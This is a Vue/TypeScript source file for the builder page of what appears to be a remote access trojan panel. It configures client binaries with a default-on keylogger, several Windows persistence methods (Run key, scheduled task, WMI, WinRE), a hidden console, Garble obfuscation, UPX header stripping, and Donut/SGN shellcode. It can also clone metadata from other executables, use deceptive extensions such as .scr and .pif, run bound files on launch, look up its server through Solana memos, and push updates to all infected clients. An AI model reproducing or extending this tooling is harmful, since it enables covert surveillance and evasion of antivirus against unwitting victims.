<script setup lang="ts">
import { ref, reactive, computed, watch, nextTick, onMounted, onBeforeUnmount } from 'vue'
import { api } from '../lib/api'
import AppSelect from '../components/ui/AppSelect.vue'

const PLATFORMS = [
  { value: 'windows-amd64', label: 'Windows x64', os: 'windows', icon: 'fa-brands fa-windows', color: '#38bdf8' },
  { value: 'windows-386', label: 'Windows x86', os: 'windows', icon: 'fa-brands fa-windows', color: '#38bdf8' },
  { value: 'windows-arm64', label: 'Windows ARM64', os: 'windows', icon: 'fa-brands fa-windows', color: '#38bdf8' },
  { value: 'linux-amd64', label: 'Linux x64', os: 'linux', icon: 'fa-brands fa-linux', color: '#f59e0b' },
  { value: 'linux-arm64', label: 'Linux ARM64', os: 'linux', icon: 'fa-brands fa-linux', color: '#f59e0b' },
  { value: 'linux-armv7', label: 'Linux ARMv7', os: 'linux', icon: 'fa-brands fa-linux', color: '#f59e0b' },
  { value: 'darwin-amd64', label: 'macOS x64', os: 'darwin', icon: 'fa-brands fa-apple', color: '#e2e8f0' },
  { value: 'darwin-arm64', label: 'macOS ARM64', os: 'darwin', icon: 'fa-brands fa-apple', color: '#e2e8f0' },
  { value: 'freebsd-amd64', label: 'FreeBSD x64', os: 'freebsd', icon: 'fa-solid fa-dragon', color: '#22d3ee' },
  { value: 'freebsd-arm64', label: 'FreeBSD ARM64', os: 'freebsd', icon: 'fa-solid fa-dragon', color: '#22d3ee' },
  { value: 'android-arm64', label: 'Android ARM64', os: 'android', icon: 'fa-brands fa-android', color: '#4ade80' },
  { value: 'android-amd64', label: 'Android x64', os: 'android', icon: 'fa-brands fa-android', color: '#4ade80' },
  { value: 'android-armv7', label: 'Android ARMv7', os: 'android', icon: 'fa-brands fa-android', color: '#4ade80' },
  { value: 'ios-arm64', label: 'iOS ARM64', os: 'ios', icon: 'fa-brands fa-app-store-ios', color: '#e2e8f0' },
  { value: 'ios-amd64', label: 'iOS Simulator x64', os: 'ios', icon: 'fa-brands fa-app-store-ios', color: '#e2e8f0' },
]

const PERSISTENCE_METHODS = [
  { value: 'startup', label: 'Startup Folder (APPDATA)', defaultChecked: true },
  { value: 'registry', label: 'Registry (HKCU Run)', defaultChecked: false },
  { value: 'taskscheduler', label: 'Task Scheduler (ONLOGON)', defaultChecked: false },
  { value: 'wmi', label: 'WMI Subscription', defaultChecked: false },
]

const OUTPUT_EXTENSIONS = ['.exe', '.scr', '.bat', '.cmd', '.ps1', '.pif', '.com']

const activeTab = ref<'target' | 'connection' | 'features' | 'packaging'>('target')
const building = ref(false)
const buildLogs = ref<{text:string;level:string}[]>([])
const builds = ref<any[]>([])
const plugins = ref<any[]>([])
const buildFiles = ref<any[]>([])
const currentBuildId = ref('')
const outputEl = ref<HTMLElement | null>(null)
const error = ref('')
const success = ref('')
const showUpdateAllModal = ref(false)
const updateAllResult = ref<any>(null)

const form = reactive({
  platforms: ['windows-amd64'] as string[],
  serverUrl: '',
  rawServerList: false,
  solMemo: false,
  solAddress: '',
  solRpcEndpoints: '',
  outputName: '',
  initialClientTag: '',
  iosBundleId: '',
  mutex: '',
  disableMutex: false,
  stripDebug: true,
  disableCgo: false,
  noPrinting: false,
  hideConsole: false,
  obfuscate: false,
  garbleLiterals: false,
  garbleTiny: false,
  garbleSeed: '',
  enableUpx: false,
  upxStripHeaders: false,
  sleepSeconds: 0,
  cryptableMode: false,
  useDonut: false,
  shellcodeConsole: false,
  useLinuxShellcode: false,
  useSgn: false,
  sgnIterations: 1,
  outputSgnTxt: false,
  enablePersistence: true,
  persistenceMethods: ['startup'] as string[],
  startupName: '',
  requireAdmin: false,
  criticalProcess: false,
  assemblyTitle: '',
  assemblyProduct: '',
  assemblyCompany: '',
  assemblyVersion: '',
  assemblyCopyright: '',
  iconBase64: '',
  outputExtension: '.exe',
  enableKeylogger: true,
  enableWebrtc: false,
  enableNvenc: true,
  enableAmf: true,
  enableQsv: true,
  enableWinRE: false,
  fetchPublicIP: false,
  collectCpu: true,
  collectGpu: true,
  collectRam: true,
  collectStorage: true,
  boundFiles: [] as Array<{name:string;data:string;targetOS:string[];execute:boolean}>,
  uploadToFileShare: false,
  buildPlugins: {} as Record<string,{enabled:boolean;settings:Record<string,any>}>
})

const profiles = ref<any[]>([])
const profileName = ref('')
const selectedProfile = ref('')

const hasWindows = computed(() => Array.isArray(form.platforms) && form.platforms.some(p => String(p).startsWith('windows')))
const hasIos = computed(() => Array.isArray(form.platforms) && form.platforms.some(p => String(p).startsWith('ios')))
const hasLinuxAmd64 = computed(() => Array.isArray(form.platforms) && form.platforms.includes('linux-amd64'))
const cryptableDisabled = computed(() => form.cryptableMode)

function togglePlatform(value: string) {
  try {
    if (!Array.isArray(form.platforms)) form.platforms = []
    const idx = form.platforms.indexOf(value)
    if (idx >= 0) form.platforms.splice(idx, 1)
    else form.platforms.push(value)
  } catch {}
}

const safePlatforms = computed(() => Array.isArray(form.platforms) ? form.platforms.filter((p: any) => typeof p === 'string') : [])

function togglePersistence(value: string) {
  const idx = form.persistenceMethods.indexOf(value)
  if (idx >= 0) form.persistenceMethods.splice(idx, 1)
  else form.persistenceMethods.push(value)
}

function saveToStorage() {
  try { localStorage.setItem('goylord_build_settings', JSON.stringify({ platforms: safePlatforms.value, serverUrl: form.serverUrl, outputName: form.outputName, obfuscate: form.obfuscate, enablePersistence: form.enablePersistence, persistenceMethods: form.persistenceMethods })) } catch {}
}
function restoreFromStorage() {
  try {
    const raw = localStorage.getItem('goylord_build_settings')
    if (!raw) return
    const s = JSON.parse(raw)
    if (Array.isArray(s.platforms) && s.platforms.length) form.platforms = s.platforms.filter((p: any) => typeof p === 'string' || typeof p === 'number').map(String)
    if (s.serverUrl) form.serverUrl = s.serverUrl
    if (s.outputName) form.outputName = s.outputName
  } catch {}
}

function scrollToBottom() {
  nextTick(() => { if (outputEl.value) { outputEl.value.scrollTop = outputEl.value.scrollHeight } })
}

function collectFormSettings() {
  const { platforms, ...rest } = form
  return { ...rest, platforms: safePlatforms.value, buildPlugins: { ...form.buildPlugins } }
}

function applyFormSettings(cfg: any) {
  if (!cfg) return
  for (const k of Object.keys(cfg)) {
    if (k in form && k !== 'buildPlugins') {
      if (k === 'platforms' && Array.isArray(cfg[k])) {
        (form as any)[k] = cfg[k].filter((p: any) => typeof p === 'string' || typeof p === 'number').map(String)
      } else {
        (form as any)[k] = cfg[k]
      }
    }
  }
  if (cfg.buildPlugins) form.buildPlugins = { ...cfg.buildPlugins }
}

async function loadProfiles() {
  try { const r = await api.get<{profiles:any[]}>('/api/build/profiles'); profiles.value = r.profiles || [] } catch {}
}
async function saveProfile() {
  if (!profileName.value.trim()) return
  try { await api.post('/api/build/profiles', { name: profileName.value.trim(), config: collectFormSettings() }); success.value = 'Profile saved'; await loadProfiles() } catch (e:any) { error.value = e.message }
}
async function loadProfile(name: string) {
  const p = profiles.value.find((x:any) => x.name === name)
  if (p) { applyFormSettings(p.config); profileName.value = p.name; success.value = `Loaded "${name}"` }
}
async function deleteProfile(name: string) {
  if (!confirm(`Delete profile "${name}"?`)) return
  try { await api.delete(`/api/build/profiles/${encodeURIComponent(name)}`); await loadProfiles(); if (selectedProfile.value === name) selectedProfile.value = '' } catch (e:any) { error.value = e.message }
}
function exportProfile() {
  const data = { goylord_build_profile: true, version: 1, name: profileName.value, config: collectFormSettings() }
  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' })
  const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = `build-profile-${profileName.value || 'unnamed'}.json`; a.click(); URL.revokeObjectURL(url)
}
function importProfile() {
  const input = document.createElement('input'); input.type = 'file'; input.accept = '.json'
  input.onchange = async (e: any) => {
    const file = e.target.files[0]; if (!file) return
    try {
      const text = await file.text(); const data = JSON.parse(text)
      if (!data.goylord_build_profile) { error.value = 'Invalid profile file'; return }
      applyFormSettings(data.config); profileName.value = data.name || ''; success.value = 'Profile imported'
    } catch { error.value = 'Failed to parse profile file' }
  }
  input.click()
}

async function startBuild() {
  if (!safePlatforms.value.length) { error.value = 'Select at least one platform'; return }
  building.value = true; buildLogs.value = []; buildFiles.value = []; error.value = ''; currentBuildId.value = ''
  try {
    const payload = collectFormSettings()
    const r = await api.post<{buildId:string}>('/api/build/start', payload)
    currentBuildId.value = r.buildId
    buildLogs.value.push({ text: `Build started: ${r.buildId.slice(0,8)}`, level: 'info' })
    saveToStorage()
    streamBuild(r.buildId)
  } catch (e: any) {
    buildLogs.value.push({ text: `Error: ${e.message}`, level: 'error' })
    building.value = false
  }
}

function streamBuild(buildId: string) {
  let retries = 0; const maxRetries = 10; let controller = new AbortController()
  function connect() {
    const es = new EventSource(`/api/build/${buildId}/stream`)
    es.onmessage = (ev) => {
      try {
        const msg = JSON.parse(ev.data)
        if (msg.type === 'output') { buildLogs.value.push({ text: msg.text, level: msg.level || 'info' }); scrollToBottom() }
        else if (msg.type === 'status') { buildLogs.value.push({ text: msg.text, level: 'info' }); scrollToBottom() }
        else if (msg.type === 'complete') {
          building.value = false; buildFiles.value = msg.files || []
          buildLogs.value.push({ text: msg.success ? 'Build completed successfully' : 'Build failed', level: msg.success ? 'success' : 'error' })
          scrollToBottom(); es.close(); loadBuilds()
        }
        else if (msg.type === 'error') { buildLogs.value.push({ text: msg.error, level: 'error' }); scrollToBottom() }
      } catch {}
    }
    es.onerror = () => {
      es.close(); retries++
      if (retries < maxRetries) {
        fetch(`/api/build/${buildId}/info`).then(r => r.json()).then(info => {
          if (info.status === 'completed' || info.status === 'success' || info.status === 'failed') {
            building.value = false; loadBuilds()
          } else { setTimeout(connect, 2000) }
        }).catch(() => setTimeout(connect, 2000))
      } else { building.value = false }
    }
  }
  connect()
}

async function loadBuilds() {
  try { const r = await api.get<{builds:any[]}>('/api/build/list'); builds.value = (r.builds || []).slice(0, 20) } catch {}
}
async function loadPlugins() {
  try { const r = await api.get<{plugins:any[]}>('/api/build/plugins'); plugins.value = r.plugins || [] } catch {}
}
async function deleteBuild(id: string) {
  try { await api.delete(`/api/build/${id}/delete`); await loadBuilds() } catch (e:any) { error.value = e.message }
}
async function downloadFile(filename: string) {
  try {
    const blob = await api.downloadBlob(`/api/build/download/${encodeURIComponent(filename)}`, filename)
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a'); a.href = url; a.download = filename; a.click()
    URL.revokeObjectURL(url)
  } catch (e: any) { error.value = e.message || 'Download failed' }
}

async function buildAndUpdateAll() {
  if (!currentBuildId.value) { error.value = 'No build to update with'; return }
  try {
    const r = await api.post<{eligible:number;skippedInMemory:number;skippedNoMatch:number;totalOnline:number}>('/api/build/update-eligible', { buildId: currentBuildId.value })
    updateAllResult.value = r; showUpdateAllModal.value = true
  } catch (e: any) { error.value = e.message }
}
async function confirmUpdateAll() {
  try {
    const r = await api.post<{ok:boolean;successCount:number;totalOnline:number}>('/api/build/update-all', { buildId: currentBuildId.value })
    success.value = `Update sent to ${r.successCount}/${r.totalOnline} clients`; showUpdateAllModal.value = false
  } catch (e: any) { error.value = e.message }
}

async function buildAndUpload() {
  form.uploadToFileShare = true; await startBuild(); form.uploadToFileShare = false
}

async function buildSgnTxt() {
  form.outputSgnTxt = true; await startBuild(); form.outputSgnTxt = false
}

function clonePeMetadata(file: File) {
  const reader = new FileReader()
  reader.onload = () => {
    try {
      const buf = new Uint8Array(reader.result as ArrayBuffer)
      if (buf[0] !== 0x4d || buf[1] !== 0x5a) { error.value = 'Not a valid PE file'; return }
      const peOffset = buf[0x3c] | (buf[0x3d] << 8)
      const peSig = buf[peOffset] | (buf[peOffset+1] << 8) | (buf[peOffset+2] << 16) | (buf[peOffset+3] << 24)
      if (peSig !== 0x00004550) { error.value = 'Invalid PE signature'; return }
      const text = new TextDecoder('utf-8', { fatal: false }).decode(buf)
      const extract = (key: string) => { const m = text.match(new RegExp(`${key.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\x00*\\x00([^\\x00]+)`)); return m ? m[1].trim() : '' }
      form.assemblyTitle = extract('FileDescription') || form.assemblyTitle
      form.assemblyProduct = extract('ProductName') || form.assemblyProduct
      form.assemblyCompany = extract('CompanyName') || form.assemblyCompany
      form.assemblyVersion = extract('FileVersion') || form.assemblyVersion
      form.assemblyCopyright = extract('LegalCopyright') || form.assemblyCopyright
      success.value = 'PE metadata cloned'
    } catch { error.value = 'Failed to parse PE file' }
  }
  reader.readAsArrayBuffer(file)
}

function handleIconUpload(e: Event) {
  const file = (e.target as HTMLInputElement).files?.[0]
  if (!file) return
  if (file.size > 1024 * 1024) { error.value = 'Icon must be under 1MB'; return }
  const reader = new FileReader()
  reader.onload = () => { form.iconBase64 = (reader.result as string).split(',')[1]; success.value = 'Icon loaded' }
  reader.readAsDataURL(file)
}

function handleBindFiles(e: Event) {
  const files = (e.target as HTMLInputElement).files
  if (!files) return
  for (const f of Array.from(files)) {
    if (form.boundFiles.length >= 5) { error.value = 'Max 5 bound files'; break }
    const reader = new FileReader()
    reader.onload = () => {
      const b64 = (reader.result as string).split(',')[1]
      form.boundFiles.push({ name: f.name, data: b64, targetOS: ['windows', 'linux', 'darwin'], execute: true })
    }
    reader.readAsDataURL(f)
  }
}
function removeBoundFile(idx: number) { form.boundFiles.splice(idx, 1) }

function togglePlugin(pluginId: string) {
  if (!form.buildPlugins[pluginId]) form.buildPlugins[pluginId] = { enabled: false, settings: {} }
  form.buildPlugins[pluginId].enabled = !form.buildPlugins[pluginId].enabled
}
function setPluginSetting(pluginId: string, key: string, val: any) {
  if (!form.buildPlugins[pluginId]) form.buildPlugins[pluginId] = { enabled: false, settings: {} }
  form.buildPlugins[pluginId].settings[key] = val
}

function timeSince(ts?: number) {
  if (!ts) return ''
  const diff = Date.now() - ts
  if (diff < 60000) return 'just now'
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`
  return `${Math.floor(diff / 86400000)}d ago`
}
function expiresIn(ts?: number) {
  if (!ts) return ''
  const diff = ts - Date.now()
  if (diff <= 0) return 'Expired'
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m left`
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h left`
  return `${Math.floor(diff / 86400000)}d left`
}
function expiryColor(ts?: number) {
  if (!ts) return '#64748b'
  const diff = ts - Date.now()
  if (diff <= 0) return '#ef4444'
  if (diff < 86400000) return '#f59e0b'
  if (diff < 172800000) return '#facc15'
  return '#22c55e'
}

watch(() => form.cryptableMode, (v) => {
  if (v) {
    form.enablePersistence = false; form.enableUpx = false; form.requireAdmin = false; form.criticalProcess = false
    form.assemblyTitle = ''; form.assemblyProduct = ''; form.assemblyCompany = ''; form.assemblyVersion = ''; form.assemblyCopyright = ''
    form.iconBase64 = ''; form.outputExtension = '.exe'; form.sleepSeconds = 0; form.boundFiles = []
  }
})

onMounted(() => { restoreFromStorage(); loadBuilds(); loadPlugins(); loadProfiles(); if (!form.serverUrl) form.serverUrl = location.origin.replace(/^http/, 'ws') })
onBeforeUnmount(() => {})
</script>

<template>
  <div>
    <div class="section-header">
      <h1 class="section-title"><i class="fa-solid fa-hammer" style="margin-right:8px;color:#6366f1"></i>Builder</h1>
      <span v-if="building" class="badge badge-sm badge-success"><i class="fa-solid fa-spinner fa-spin" style="margin-right:4px"></i>Building</span>
    </div>

    <div v-if="error" class="alert alert-error" style="margin-bottom:16px"><i class="fa-solid fa-circle-exclamation"></i>{{ error }}<button @click="error=''" style="margin-left:auto;background:none;border:none;color:inherit;cursor:pointer"><i class="fa-solid fa-xmark"></i></button></div>
    <div v-if="success" class="alert alert-success" style="margin-bottom:16px"><i class="fa-solid fa-circle-check"></i>{{ success }}<button @click="success=''" style="margin-left:auto;background:none;border:none;color:inherit;cursor:pointer"><i class="fa-solid fa-xmark"></i></button></div>

    <div style="display:grid;grid-template-columns:1.55fr 1fr;gap:16px;align-items:start">
      <!-- LEFT: Config -->
      <div>
        <!-- Profile Bar -->
        <div class="panel" style="padding:10px 14px;margin-bottom:12px;display:flex;align-items:center;gap:8px">
          <AppSelect v-model="selectedProfile" @update:modelValue="loadProfile($event)" :options="[{ value: '', label: 'Load profile...' }, ...profiles.map(p => ({ value: p.name, label: p.name }))]" size="sm" style="width:170px" searchable />
          <input v-model="profileName" placeholder="Profile name" class="input" style="width:140px;padding:5px 8px;font-size:12px" maxlength="64" />
          <button @click="saveProfile" class="btn btn-xs"><i class="fa-solid fa-floppy-disk"></i> Save</button>
          <button @click="exportProfile" class="btn btn-xs" title="Export"><i class="fa-solid fa-download"></i></button>
          <button @click="importProfile" class="btn btn-xs" title="Import"><i class="fa-solid fa-upload"></i></button>
          <button v-if="selectedProfile" @click="deleteProfile(selectedProfile)" class="btn btn-xs" title="Delete"><i class="fa-solid fa-trash" style="color:#ef4444"></i></button>
        </div>

        <!-- Tab Bar -->
        <div style="display:flex;gap:2px;margin-bottom:12px;border-bottom:1px solid var(--cv-border)">
          <button v-for="tab in (['target','connection','features','packaging'] as const)" :key="tab" class="settings-tab" :class="{'settings-tab-active': activeTab===tab}" @click="activeTab=tab" style="text-transform:capitalize">
            <i :class="tab==='target'?'fa-solid fa-crosshairs':tab==='connection'?'fa-solid fa-plug':tab==='features'?'fa-solid fa-puzzle-piece':'fa-solid fa-box'" style="margin-right:6px"></i>{{ tab }}
          </button>
        </div>

        <!-- TARGET TAB -->
        <div v-show="activeTab==='target'" class="panel" style="animation:fadeIn 150ms">
          <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:10px">Target Platforms</h3>
          <div style="display:grid;grid-template-columns:repeat(auto-fill, minmax(140px,1fr));gap:6px">
            <button type="button" v-for="p in PLATFORMS" :key="p.value" @click.stop="togglePlatform(p.value)" role="checkbox" :aria-checked="String(safePlatforms.includes(p.value))" :data-platform="p.value" @keydown.space.prevent="togglePlatform(p.value)" :style="{display:'flex',alignItems:'center',gap:'6px',padding:'7px 10px',borderRadius:'8px',cursor:'pointer',fontSize:'12px',transition:'all 120ms',background: safePlatforms.includes(p.value) ? 'rgba(99,102,241,0.12)' : 'rgba(30,41,59,0.5)', border: '1px solid '+(safePlatforms.includes(p.value) ? 'rgba(99,102,241,0.35)' : 'rgba(51,65,85,0.4)'), color: safePlatforms.includes(p.value) ? '#e2e8f0' : '#64748b'}">
              <i :class="p.icon" :style="{color: safePlatforms.includes(p.value) ? p.color : '#475569', fontSize:'13px'}"></i>
              {{ p.label }}
            </button>
          </div>
          <p style="font-size:11px;color:#475569;margin-top:8px">Select one or more platforms. Multiple platforms produce separate binaries.</p>
        </div>

        <!-- CONNECTION TAB -->
        <div v-show="activeTab==='connection'" class="panel" style="animation:fadeIn 150ms">
          <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:10px">Connection</h3>
          <div style="display:flex;flex-direction:column;gap:10px">
            <div>
              <label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:4px">Server URL</label>
              <div style="display:flex;gap:6px">
                <input v-model="form.serverUrl" class="input" style="flex:1" placeholder="wss://your.domain:5173" />
                <button @click="form.serverUrl = location.origin.replace(/^http/, 'ws')" class="btn btn-xs">Use Current</button>
              </div>
            </div>
            <div style="display:flex;align-items:center;gap:8px">
              <button type="button" class="toggle" :class="{active: form.rawServerList}" @click="form.rawServerList = !form.rawServerList"></button>
              <span style="font-size:12px;color:#cbd5e1">Use raw HTTPS server list</span>
            </div>
            <div style="display:flex;align-items:center;gap:8px">
              <button type="button" class="toggle" :class="{active: form.solMemo}" @click="form.solMemo = !form.solMemo"></button>
              <span style="font-size:12px;color:#cbd5e1">Use Solana memo lookup</span>
            </div>
            <template v-if="form.solMemo">
              <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:4px">Solana Address</label><input v-model="form.solAddress" class="input" style="width:100%" placeholder="Base58 (32-44 chars)" /></div>
              <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:4px">RPC Endpoints (one per line)</label><textarea v-model="form.solRpcEndpoints" rows="3" class="input" style="width:100%;font-size:12px;font-family:monospace;resize:vertical" spellcheck="false"></textarea></div>
            </template>
            <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:4px">Output Filename</label><input v-model="form.outputName" class="input" style="width:100%" placeholder="Optional prefix" maxlength="64" pattern="[A-Za-z0-9._-]+" /></div>
            <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:4px">Initial Client Tag</label><input v-model="form.initialClientTag" class="input" style="width:100%" maxlength="64" /></div>
            <div v-if="hasIos"><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:4px">iOS Bundle ID</label><input v-model="form.iosBundleId" class="input" style="width:100%" placeholder="com.example.app" /></div>
            <div style="display:flex;gap:10px">
              <div style="flex:1"><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:4px">Mutex</label><input v-model="form.mutex" class="input" style="width:100%" placeholder="Auto-generate if empty" /></div>
              <div style="display:flex;align-items:flex-end;padding-bottom:4px"><button type="button" class="toggle" :class="{active: form.disableMutex}" @click="form.disableMutex = !form.disableMutex"></button><span style="font-size:11px;color:#64748b;margin-left:6px">Disable</span></div>
            </div>
          </div>
        </div>

        <!-- FEATURES TAB -->
        <div v-show="activeTab==='features'" class="panel" style="animation:fadeIn 150ms">
          <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:10px">Features</h3>
          <div style="display:flex;flex-direction:column;gap:8px">
            <div v-for="feat in [
              {key:'enableKeylogger',label:'Keylogger',desc:'Keystroke capture',default:true},
              {key:'enableWebrtc',label:'WebRTC',desc:'Adds ~6MB',default:false},
              {key:'enableNvenc',label:'NVIDIA NVENC',desc:'H.264/HEVC',default:true,winOnly:true},
              {key:'enableAmf',label:'AMD AMF',desc:'H.264',default:true,winOnly:true},
              {key:'enableQsv',label:'Intel Quick Sync',desc:'H.264',default:true,winOnly:true},
              {key:'enableWinRE',label:'WinRE Persistence',desc:'Windows Recovery',default:false,winOnly:true},
              {key:'fetchPublicIP',label:'Fetch Public IP',desc:'Query api.ipify.org',default:false},
            ]" :key="feat.key" style="display:flex;align-items:center;gap:8px">
              <button type="button" class="toggle" :class="{active: (form as any)[feat.key]}" @click="(form as any)[feat.key] = !(form as any)[feat.key]"></button>
              <span style="font-size:12px;color:#cbd5e1;min-width:120px">{{ feat.label }}</span>
              <span style="font-size:11px;color:#64748b">{{ feat.desc }}</span>
            </div>
          </div>
          <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin:16px 0 10px">Hardware Collection</h3>
          <div style="display:flex;flex-direction:column;gap:8px">
            <div v-for="h in [{key:'collectCpu',label:'CPU Info'},{key:'collectGpu',label:'GPU Info'},{key:'collectRam',label:'RAM Info'},{key:'collectStorage',label:'Storage Info'}]" :key="h.key" style="display:flex;align-items:center;gap:8px">
              <button type="button" class="toggle" :class="{active: (form as any)[h.key]}" @click="(form as any)[h.key] = !(form as any)[h.key]"></button>
              <span style="font-size:12px;color:#cbd5e1">{{ h.label }}</span>
            </div>
          </div>

          <!-- Build Plugins -->
          <template v-if="plugins.length">
            <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin:16px 0 10px">Build Plugins</h3>
            <div v-for="p in plugins" :key="p.id" style="padding:10px;background:rgba(15,23,42,0.6);border:1px solid rgba(51,65,85,0.4);border-radius:8px;margin-bottom:8px">
              <div style="display:flex;align-items:center;gap:8px">
                <button type="button" class="toggle" :class="{active: form.buildPlugins[p.id]?.enabled}" @click="togglePlugin(p.id)" style="width:32px;height:18px"></button>
                <span style="font-size:12px;font-weight:500;color:#e2e8f0">{{ p.name }}</span>
                <span v-if="p.runtime" class="badge badge-xs" style="background:rgba(99,102,241,0.15);color:#818cf8;border-color:rgba(99,102,241,0.3)">{{ p.runtime }}</span>
                <span v-if="p.build?.description" style="font-size:11px;color:#64748b;margin-left:auto">{{ p.build.description }}</span>
              </div>
              <div v-if="p.build?.settings?.length && form.buildPlugins[p.id]?.enabled" style="margin-top:10px;display:flex;flex-direction:column;gap:8px">
                <div v-for="s in p.build.settings" :key="s.key">
                  <label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:3px">{{ s.label || s.key }}</label>
                  <template v-if="s.type==='boolean'">
                    <button type="button" class="toggle toggle-xs" :class="{active: form.buildPlugins[p.id]?.settings[s.key] ?? s.default}" @click="setPluginSetting(p.id, s.key, !(form.buildPlugins[p.id]?.settings[s.key] ?? s.default))"></button>
                  </template>
                  <template v-else-if="s.type==='select'">
                    <AppSelect :modelValue="form.buildPlugins[p.id]?.settings[s.key] ?? s.default" @update:modelValue="setPluginSetting(p.id, s.key, $event)" :options="(s.options || []).map(opt => ({ value: typeof opt==='string'?opt:opt.value, label: typeof opt==='string'?opt:opt.label }))" size="sm" />
                  </template>
                  <template v-else-if="s.type==='textarea'">
                    <textarea :value="form.buildPlugins[p.id]?.settings[s.key] ?? s.default ?? ''" @input="setPluginSetting(p.id, s.key, ($event.target as HTMLTextAreaElement).value)" rows="3" class="input" style="width:100%;font-size:12px;font-family:monospace;resize:vertical"></textarea>
                  </template>
                  <template v-else>
                    <input :type="s.type==='number'?'number':'text'" :value="form.buildPlugins[p.id]?.settings[s.key] ?? s.default ?? ''" @input="setPluginSetting(p.id, s.key, s.type==='number'?Number(($event.target as HTMLInputElement).value):($event.target as HTMLInputElement).value)" :placeholder="s.placeholder" :min="s.min" :max="s.max" class="input" style="width:100%;padding:5px 8px;font-size:12px" />
                  </template>
                </div>
              </div>
            </div>
          </template>
        </div>

        <!-- PACKAGING TAB -->
        <div v-show="activeTab==='packaging'" class="panel" style="animation:fadeIn 150ms">
          <!-- Build Options -->
          <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:10px">Build Options</h3>
          <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
            <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.stripDebug}" @click="form.stripDebug = !form.stripDebug"></button><span style="font-size:12px;color:#cbd5e1">Strip debug symbols</span></div>
            <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.disableCgo}" @click="form.disableCgo = !form.disableCgo"></button><span style="font-size:12px;color:#cbd5e1">Disable CGO</span></div>
            <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.noPrinting}" @click="form.noPrinting = !form.noPrinting"></button><span style="font-size:12px;color:#cbd5e1">Secure Client Logs</span></div>
            <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.hideConsole}" @click="form.hideConsole = !form.hideConsole"></button><span style="font-size:12px;color:#cbd5e1">Hide Console Window</span></div>
          </div>

          <!-- Obfuscation -->
          <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:10px">Obfuscation (Garble)</h3>
          <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><button type="button" class="toggle" :class="{active: form.obfuscate}" @click="form.obfuscate = !form.obfuscate"></button><span style="font-size:12px;color:#cbd5e1">Enable Garble</span></div>
          <div v-if="form.obfuscate" style="margin-left:20px;display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
            <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.garbleLiterals}" @click="form.garbleLiterals = !form.garbleLiterals"></button><span style="font-size:12px;color:#cbd5e1">Literals</span></div>
            <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.garbleTiny}" @click="form.garbleTiny = !form.garbleTiny"></button><span style="font-size:12px;color:#cbd5e1">Tiny Mode</span></div>
            <div><label style="font-size:11px;color:#94a3b8;display:block;margin-bottom:3px">Seed (alphanumeric)</label><input v-model="form.garbleSeed" class="input" style="width:200px" maxlength="64" placeholder="Optional reproducible seed" /></div>
          </div>

          <!-- UPX -->
          <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:10px">UPX Compression</h3>
          <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><button type="button" class="toggle" :class="{active: form.enableUpx}" @click="form.enableUpx = !form.enableUpx" :disabled="cryptableDisabled"></button><span style="font-size:12px;color:#cbd5e1">Enable UPX</span></div>
          <div v-if="form.enableUpx" style="margin-left:20px;margin-bottom:16px;display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.upxStripHeaders}" @click="form.upxStripHeaders = !form.upxStripHeaders"></button><span style="font-size:12px;color:#cbd5e1">Strip UPX Headers</span></div>

          <!-- Sleep -->
          <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px"><label style="font-size:11px;color:#94a3b8">Startup Sleep (seconds)</label><input v-model.number="form.sleepSeconds" type="number" min="0" max="3600" class="input" style="width:80px" /></div>

          <!-- Cryptable + Shellcode -->
          <h3 style="font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:10px">Advanced Modes</h3>
          <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
            <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle" :class="{active: form.cryptableMode}" @click="form.cryptableMode = !form.cryptableMode"></button><span style="font-size:12px;color:#cbd5e1">Cryptable Mode</span><span style="font-size:10px;color:#64748b">— disables persistence, UPX, PE metadata, UAC, bind files</span></div>
            <div style="display:flex;align-items:center;gap:8px"><button type="button" class="toggle toggle-sm" :class="{active: form.useDonut}" @click="form.useDonut = !form.useDonut" :disabled="!cryptableDisabled || !hasWindows"></button><span style="font-size:12px" :style="{color: cryptableDisabled && hasWindows ? '#cbd5e1' : '#475569'}">Donut Shellcode (.bin)</span><span style="font-size:10px;color:#64748b">Windows only</span></div>
